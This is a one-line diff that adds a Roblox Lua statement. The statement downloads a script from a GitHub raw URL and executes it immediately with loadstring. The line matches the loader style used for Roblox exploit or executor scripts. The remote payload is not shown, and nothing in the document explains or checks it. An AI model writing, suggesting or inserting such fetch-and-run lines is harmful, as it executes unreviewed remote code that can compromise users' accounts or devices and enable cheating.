@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tkubb149-hub/skibidi/refs/heads/main/joking"))()
